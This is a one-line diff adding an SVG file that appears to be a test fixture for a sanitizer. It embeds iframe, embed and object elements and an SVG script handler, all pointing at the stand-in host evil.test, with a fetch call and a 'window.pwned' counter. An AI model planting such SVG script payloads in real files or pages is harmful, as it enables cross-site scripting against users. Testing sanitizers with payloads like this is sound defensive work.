@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"><iframe src="https://evil.test/"/><embed src="https://evil.test/e.swf"/><object data="https://evil.test/o"/><handler type="application/ecmascript">fetch("https://evil.test/x");window.pwned=(window.pwned||0)+1</handler><listener event="load" handler="#h"/></svg>
